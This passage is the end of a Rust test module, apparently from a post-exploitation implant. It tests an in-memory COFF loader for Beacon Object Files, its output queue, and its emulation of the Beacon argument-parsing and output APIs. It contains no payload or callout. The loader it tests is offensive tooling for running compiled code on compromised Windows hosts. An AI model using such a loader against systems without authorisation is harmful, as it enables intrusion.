        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].callback_type, BOF_COULD_NOT_RUN);
    }

    #[test]
    fn garbage_object_returns_could_not_run() {
        let garbage = vec![0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, 0x00, 0x00];
        let result = coffee_execute("go", &garbage, &[], false);
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].callback_type, BOF_COULD_NOT_RUN);
    }

    // COFF with wrong machine type (i386 = 0x14c instead of AMD64 = 0x8664)
    #[test]
    fn wrong_machine_type_returns_could_not_run() {
        let mut coff = vec![0u8; 20]; // minimal COFF header
        // Machine = 0x014C (i386)
        coff[0] = 0x4C;
        coff[1] = 0x01;
        let result = coffee_execute("go", &coff, &[], false);
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].callback_type, BOF_COULD_NOT_RUN);
    }

    #[cfg(not(windows))]
    #[test]
    fn non_windows_always_returns_could_not_run() {
        let result = coffee_execute("go", &[0u8; 100], &[], false);
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].callback_type, BOF_COULD_NOT_RUN);
    }

    #[cfg(not(windows))]
    #[test]
    fn threaded_non_windows_stub_returns_none() {
        let result = coffee_execute_threaded(
            "go".to_string(),
            vec![0u8; 20],
            vec![],
            new_bof_output_queue(),
            42,
        );
        assert!(result.is_none());
    }

    #[test]
    fn new_bof_output_queue_starts_empty() {
        let queue = new_bof_output_queue();
        let guard = queue.lock().expect("lock");
        assert!(guard.is_empty());
    }

    #[test]
    fn bof_output_queue_can_push_and_drain() {
        let queue = new_bof_output_queue();

        // Simulate a background thread pushing callbacks
        {
            let mut guard = queue.lock().expect("lock");
            guard.push(BofCallback {
                callback_type: BOF_RAN_OK,
                payload: vec![1, 2, 3],
                request_id: 7,
            });
            guard.push(BofCallback {
                callback_type: BOF_CALLBACK_OUTPUT,
                payload: vec![4, 5],
                request_id: 7,
            });
        }

        // Drain (take) the callbacks
        let drained = std::mem::take(&mut *queue.lock().expect("lock"));
        assert_eq!(drained.len(), 2);
        assert_eq!(drained[0].callback_type, BOF_RAN_OK);
        assert_eq!(drained[1].callback_type, BOF_CALLBACK_OUTPUT);

        // Queue should be empty after drain
        assert!(queue.lock().expect("lock").is_empty());
    }

    #[test]
    fn bof_output_queue_is_thread_safe() {
        let queue = new_bof_output_queue();
        let queue_clone = queue.clone();

        let handle = std::thread::spawn(move || {
            let mut guard = queue_clone.lock().expect("lock");
            guard.push(BofCallback {
                callback_type: BOF_CALLBACK_OUTPUT,
                payload: b"hello from thread".to_vec(),
                request_id: 99,
            });
        });

        handle.join().expect("thread join");

        let guard = queue.lock().expect("lock");
        assert_eq!(guard.len(), 1);
        assert_eq!(guard[0].payload, b"hello from thread");
        assert_eq!(guard[0].request_id, 99);
    }

    #[test]
    fn bof_callback_preserves_request_id() {
        let cb = BofCallback { callback_type: BOF_RAN_OK, payload: vec![], request_id: 0xDEAD };
        assert_eq!(cb.request_id, 0xDEAD);
    }

    #[test]
    fn bof_output_queue_preserves_request_id_across_drain() {
        let queue = new_bof_output_queue();
        let task_id: u32 = 42;

        {
            let mut guard = queue.lock().expect("lock");
            guard.push(BofCallback {
                callback_type: BOF_CALLBACK_OUTPUT,
                payload: b"output data".to_vec(),
                request_id: task_id,
            });
            guard.push(BofCallback {
                callback_type: BOF_RAN_OK,
                payload: Vec::new(),
                request_id: task_id,
            });
        }

        let drained = std::mem::take(&mut *queue.lock().expect("lock"));
        assert_eq!(drained.len(), 2);
        assert_eq!(drained[0].request_id, task_id);
        assert_eq!(drained[1].request_id, task_id);
    }

    // ── Beacon data-parsing API tests ──────────────────────────────────

    /// Helper: build a BOF argument buffer with a 4-byte length prefix
    /// followed by the given payload.
    fn make_arg_buf(payload: &[u8]) -> Vec<u8> {
        let mut buf = Vec::with_capacity(4 + payload.len());
        buf.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        buf.extend_from_slice(payload);
        buf
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_parse_initialises_parser() {
        // Build buffer: 4-byte prefix + 8 bytes of payload
        let payload = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        let buf = make_arg_buf(&payload);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe {
            beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32);
        }
        let parser = unsafe { parser.assume_init() };

        assert_eq!(parser.original, buf.as_ptr());
        assert_eq!(parser.buffer, unsafe { buf.as_ptr().add(4) });
        assert_eq!(parser.length, payload.len() as i32);
        assert_eq!(parser.size, payload.len() as i32);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_int_reads_le_u32() {
        // Payload: two 32-bit little-endian integers
        let mut payload = Vec::new();
        payload.extend_from_slice(&42u32.to_le_bytes());
        payload.extend_from_slice(&0xDEADBEEFu32.to_le_bytes());
        let buf = make_arg_buf(&payload);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        let v1 = unsafe { beacon_data_int(&mut parser) };
        assert_eq!(v1, 42);

        let v2 = unsafe { beacon_data_int(&mut parser) };
        assert_eq!(v2, 0xDEADBEEFu32 as i32);

        assert_eq!(parser.length, 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_int_returns_zero_when_exhausted() {
        // Only 2 bytes of payload — not enough for a 32-bit read.
        let buf = make_arg_buf(&[0xAA, 0xBB]);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        let v = unsafe { beacon_data_int(&mut parser) };
        assert_eq!(v, 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_short_reads_le_u16() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&1234u16.to_le_bytes());
        payload.extend_from_slice(&0xBEEFu16.to_le_bytes());
        let buf = make_arg_buf(&payload);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        assert_eq!(unsafe { beacon_data_short(&mut parser) }, 1234);
        assert_eq!(unsafe { beacon_data_short(&mut parser) }, 0xBEEFu16 as i16);
        assert_eq!(parser.length, 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_short_returns_zero_when_exhausted() {
        // 1 byte payload — not enough for a 16-bit read.
        let buf = make_arg_buf(&[0xFF]);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        assert_eq!(unsafe { beacon_data_short(&mut parser) }, 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_extract_reads_length_prefixed_blob() {
        // Payload: length-prefixed string "hello"
        let hello = b"hello";
        let mut payload = Vec::new();
        payload.extend_from_slice(&(hello.len() as u32).to_le_bytes());
        payload.extend_from_slice(hello);
        let buf = make_arg_buf(&payload);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        let mut out_size: i32 = 0;
        let ptr = unsafe { beacon_data_extract(&mut parser, &mut out_size) };
        assert!(!ptr.is_null());
        assert_eq!(out_size, hello.len() as i32);
        let extracted = unsafe { std::slice::from_raw_parts(ptr, out_size as usize) };
        assert_eq!(extracted, hello);
        assert_eq!(parser.length, 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_extract_with_null_size_out() {
        let data = b"ab";
        let mut payload = Vec::new();
        payload.extend_from_slice(&(data.len() as u32).to_le_bytes());
        payload.extend_from_slice(data);
        let buf = make_arg_buf(&payload);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        // Pass null for size_out — should not crash.
        let ptr = unsafe { beacon_data_extract(&mut parser, std::ptr::null_mut()) };
        assert!(!ptr.is_null());
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_extract_returns_null_when_exhausted() {
        // Empty payload — not enough for 4-byte length prefix.
        let buf = make_arg_buf(&[]);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        let mut out_size: i32 = -1;
        let ptr = unsafe { beacon_data_extract(&mut parser, &mut out_size) };
        assert!(ptr.is_null());
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_length_returns_remaining() {
        let payload = [0u8; 10];
        let buf = make_arg_buf(&payload);

        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        assert_eq!(unsafe { beacon_data_length(&mut parser) }, 10);
        // Consume 4 bytes
        let _ = unsafe { beacon_data_int(&mut parser) };
        assert_eq!(unsafe { beacon_data_length(&mut parser) }, 6);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_mixed_reads() {
        // Build a complex buffer: short(5) + int(100) + extract("test")
        let mut payload = Vec::new();
        payload.extend_from_slice(&5u16.to_le_bytes()); // short
        payload.extend_from_slice(&100u32.to_le_bytes()); // int
        let test_data = b"test";
        payload.extend_from_slice(&(test_data.len() as u32).to_le_bytes());
        payload.extend_from_slice(test_data); // extract

        let buf = make_arg_buf(&payload);
        let mut parser = std::mem::MaybeUninit::<DataParser>::uninit();
        unsafe { beacon_data_parse(parser.as_mut_ptr(), buf.as_ptr(), buf.len() as i32) };
        let mut parser = unsafe { parser.assume_init() };

        assert_eq!(unsafe { beacon_data_short(&mut parser) }, 5);
        assert_eq!(unsafe { beacon_data_int(&mut parser) }, 100);
        let mut sz: i32 = 0;
        let ptr = unsafe { beacon_data_extract(&mut parser, &mut sz) };
        assert_eq!(sz, 4);
        assert_eq!(unsafe { std::slice::from_raw_parts(ptr, sz as usize) }, b"test");
        assert_eq!(unsafe { beacon_data_length(&mut parser) }, 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_parse_null_parser_does_not_crash() {
        unsafe { beacon_data_parse(std::ptr::null_mut(), [0u8; 8].as_ptr(), 8) };
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_int_null_parser_returns_zero() {
        assert_eq!(unsafe { beacon_data_int(std::ptr::null_mut()) }, 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_data_length_null_parser_returns_zero() {
        assert_eq!(unsafe { beacon_data_length(std::ptr::null_mut()) }, 0);
    }

    // ── Beacon output API tests ────────────────────────────────────────

    #[test]
    #[allow(unsafe_code)]
    fn beacon_output_appends_to_tls_buffer() {
        let mut buf: Vec<u8> = Vec::new();
        BOF_OUTPUT_TLS.with(|cell| cell.set(&mut buf as *mut Vec<u8>));

        let data = b"hello world";
        unsafe { beacon_output(0, data.as_ptr(), data.len() as i32) };

        BOF_OUTPUT_TLS.with(|cell| cell.set(std::ptr::null_mut()));

        assert_eq!(buf, b"hello world");
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_output_null_data_is_noop() {
        let mut buf: Vec<u8> = Vec::new();
        BOF_OUTPUT_TLS.with(|cell| cell.set(&mut buf as *mut Vec<u8>));

        unsafe { beacon_output(0, std::ptr::null(), 10) };

        BOF_OUTPUT_TLS.with(|cell| cell.set(std::ptr::null_mut()));

        assert!(buf.is_empty());
    }

    #[test]
    #[allow(unsafe_code)]
    fn beacon_printf_captures_format_string() {
        let mut buf: Vec<u8> = Vec::new();
        BOF_OUTPUT_TLS.with(|cell| cell.set(&mut buf as *mut Vec<u8>));

        let fmt = b"test output\0";
        unsafe { beacon_printf(0, fmt.as_ptr()) };

        BOF_OUTPUT_TLS.with(|cell| cell.set(std::ptr::null_mut()));

        assert_eq!(buf, b"test output");
    }

    // ── toWideChar tests ───────────────────────────────────────────────

    #[test]
    #[allow(unsafe_code)]
    fn to_wide_char_converts_ascii() {
        let src = b"Hi\0";
        let mut dst = [0u16; 4];
        let result = unsafe { to_wide_char(src.as_ptr(), dst.as_mut_ptr(), 4) };
        assert_eq!(result, 1); // TRUE
        assert_eq!(dst[0], b'H' as u16);
        assert_eq!(dst[1], b'i' as u16);
        assert_eq!(dst[2], 0);
    }

    #[test]
    #[allow(unsafe_code)]
    fn to_wide_char_null_returns_zero() {
        let mut dst = [0u16; 4];
        assert_eq!(unsafe { to_wide_char(std::ptr::null(), dst.as_mut_ptr(), 4) }, 0);
        assert_eq!(unsafe { to_wide_char(b"x\0".as_ptr(), std::ptr::null_mut(), 4) }, 0);
    }

    // ── resolve_beacon_api tests ───────────────────────────────────────

    #[test]
    fn resolve_beacon_api_known_symbols() {
        assert!(resolve_beacon_api("__imp_BeaconDataParse").is_some());
        assert!(resolve_beacon_api("__imp_BeaconDataInt").is_some());
        assert!(resolve_beacon_api("__imp_BeaconDataShort").is_some());
        assert!(resolve_beacon_api("__imp_BeaconDataExtract").is_some());
        assert!(resolve_beacon_api("__imp_BeaconDataLength").is_some());
        assert!(resolve_beacon_api("__imp_BeaconOutput").is_some());
        assert!(resolve_beacon_api("__imp_BeaconPrintf").is_some());
        assert!(resolve_beacon_api("__imp_toWideChar").is_some());
    }

    #[test]
    fn resolve_beacon_api_unknown_returns_none() {
        assert!(resolve_beacon_api("__imp_BeaconGetSpawnTo").is_none());
        assert!(resolve_beacon_api("__imp_BeaconSpawnTemporaryProcess").is_none());
        assert!(resolve_beacon_api("not_a_beacon_api").is_none());
    }

    #[test]
    fn resolve_beacon_api_returns_distinct_addresses() {
        let addrs: Vec<u64> = [
            "__imp_BeaconDataParse",
            "__imp_BeaconDataInt",
            "__imp_BeaconDataShort",
            "__imp_BeaconDataExtract",
            "__imp_BeaconDataLength",
            "__imp_BeaconOutput",
            "__imp_BeaconPrintf",
            "__imp_toWideChar",
        ]
        .iter()
        .map(|s| resolve_beacon_api(s).expect("known"))
        .collect();

        // All addresses should be non-zero and unique.
        for &a in &addrs {
            assert_ne!(a, 0);
        }
        let unique: std::collections::HashSet<u64> = addrs.iter().copied().collect();
        assert_eq!(unique.len(), addrs.len());
    }
}
